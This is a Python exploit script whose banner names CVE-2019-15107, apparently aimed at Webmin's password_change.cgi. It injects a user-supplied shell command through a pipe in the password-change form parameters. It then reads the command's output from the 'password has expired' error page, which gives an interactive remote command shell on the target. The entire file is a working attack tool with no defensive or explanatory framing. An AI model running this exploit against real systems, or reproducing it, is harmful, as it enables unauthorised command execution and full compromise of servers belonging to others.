import requests
import re
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import sys


banner ='''
  ______     _______     ____   ___  _  ___        _ ____  _  ___ _____
 / ___\ \   / / ____|   |___ \ / _ \/ |/ _ \      / | ___|/ |/ _ \___  |
| |    \ \ / /|  _| _____ __) | | | | | (_) |_____| |___ \| | | | | / /
| |___  \ V / | |__|_____/ __/| |_| | |\__, |_____| |___) | | |_| |/ /
 \____|  \_/  |_____|   |_____|\___/|_|  /_/      |_|____/|_|\___//_/
by 4r2
'''
print(banner)

def exploit(url):
    vuln_url = url + "/password_change.cgi"
    headers = {
    'Accept-Charset': 'iso-8859-1,utf-8;q=0.9,*;q=0.1',
    'Accept-Language': 'en',
    'Connection': 'Close',
    'Referer': "%s/"%url,
    'Content-Length': '67',
    'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)',
    'Pragma': 'no-cache',
    'Accept': 'image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*'
    } 
    print("\nvuln_url= %s" % vuln_url)

    while True:
        cmd = input("# ")
        if cmd.lower() == "exit":
            break 
        payload="user=rootxx&pam&expired=2|%s&old=nessus|&new1=nessus&new2=nessus" % cmd
        r = requests.post(url=vuln_url, headers=headers, data=payload, verify=False)
       
        if r.status_code == 500 and "Your password has expired" in r.text : 
            
            m = re.compile(r"<p>Your password has expired, and a new one must be chosen.(.*)\n</p>", re.DOTALL)
            cmd_result = m.findall(r.text)[0]
            print("%s" % cmd_result)
        else:
            print("No Vuln Exit!")
if __name__ == "__main__":
    url = sys.argv[1]
    exploit(url)